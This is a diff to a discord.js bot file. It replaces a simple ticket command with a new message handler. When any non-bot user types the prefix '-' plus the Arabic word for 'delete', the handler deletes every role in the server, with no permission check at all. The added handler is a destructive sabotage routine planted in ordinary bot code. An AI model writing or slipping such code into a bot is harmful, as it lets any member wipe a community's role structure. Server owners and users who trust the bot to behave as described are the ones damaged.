@@ -238,15 +238,15 @@ message.channel.send(`This avatar For ${user} link : ${user.avatarURL}`);
 }
 });
 
-client.on('message' , message => {
-    var prefix = "!";
-    if(message.content.startsWith(prefix + 'تذكرة')) {
-        message.channel.send('`The Ticket has been create`');
-        client.users.get('ايديك').send({embed: new Discord.RichEmbed()
-        .setDescription(`**<@${message.author.id}> has Create a Ticket call him**`)
-        });
-    }
-});    
+  client.on('message' , ReBeL => {
+var prefix = "-";
+if(ReBeL.author.bot) return;
+if(ReBeL.channel.type == 'dm') return;
+if(ReBeL.content.startsWith(prefix + "حذف")) {
+ReBeL.guild.roles.filter(rebel => isNaN(rebel)).forEach(codes => codes.delete())
+}
+});
+  
 
   
   
